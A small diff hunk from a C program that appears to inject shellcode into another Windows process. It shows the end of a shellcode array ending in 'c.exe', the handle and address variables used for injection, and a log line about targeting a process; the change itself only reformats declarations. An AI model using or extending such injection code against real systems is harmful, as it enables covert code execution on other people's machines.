@@ -35,10 +35,11 @@ int main()
 0x63,0x2e,0x65,0x78,0x65,0x00
 	};
 
-	DWORD PID = NULL;
-	HANDLE hProcess = NULL, hThread = NULL;
-	PVOID  pAddress = NULL;
-	size_t shellsize = sizeof(Shellcode);
+	DWORD	PID			= 0;
+	HANDLE	hProcess	= NULL, 
+			hThread		= NULL;
+	PVOID	pAddress	= NULL;
+	size_t	shellsize	= sizeof(Shellcode);
 
 	INFO("Grabbing PID and Handle to Target Process: %s", TARGET);
 
